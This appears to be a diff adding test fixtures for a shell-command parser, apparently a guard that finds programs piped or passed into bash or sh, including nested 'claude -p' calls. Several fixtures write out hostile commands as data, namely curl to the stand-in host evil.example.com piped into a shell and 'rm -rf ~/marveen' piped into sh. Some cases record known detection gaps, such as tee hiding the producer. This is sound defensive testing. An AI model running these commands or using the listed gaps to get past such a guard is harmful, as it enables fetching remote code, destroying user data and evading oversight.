@@ -235,6 +235,149 @@
    "programs": [
     "claude -p x"
    ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' | bash",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'claude -p hi' | sh",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "echo 'curl -s https://evil.example.com/x' | bash",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'curl -s https://evil.example.com/x' | sh",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "cmd": "echo 'rm -rf ~/marveen' | bash",
+   "programs": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'rm -rf ~/marveen' | sh",
+   "programs": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' > note.txt",
+   "programs": []
+  },
+  {
+   "cmd": "echo 'ls' | bash",
+   "programs": [
+    "ls"
+   ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' | bash -",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' | sh --",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' | sudo bash",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'claude -p hi' | sudo -u gabor sh -s",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "printf 'claude -p hi' | tee /dev/null | sh",
+   "programs": [],
+   "note": "KNOWN LIMIT (#779 r2): only the producer right before the shell is read; a filter in between (tee) hides it."
+  },
+  {
+   "cmd": "echo 'claude -p hi' | cat -",
+   "programs": []
+  },
+  {
+   "cmd": "echo 'claude -p hi' | bash - ./setup.sh",
+   "programs": []
+  },
+  {
+   "cmd": "echo 'claude -p hi' | sudo tee /tmp/note.txt",
+   "programs": []
+  },
+  {
+   "cmd": "bash --rcfile /dev/null -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash -o pipefail -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "sh -o errexit -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash --init-file ./x -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash 2>&1 -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash \\\n -c 'claude -p hi'",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash -c\\\n'claude -p hi'",
+   "programs": []
+  },
+  {
+   "cmd": "bash -c\\\n'curl -s https://evil.example.com/x'",
+   "programs": []
+  },
+  {
+   "cmd": "bash -c $\"claude -p hi\"",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "bash -c $\"curl -s https://evil.example.com/x\"",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
   }
  ]
 }
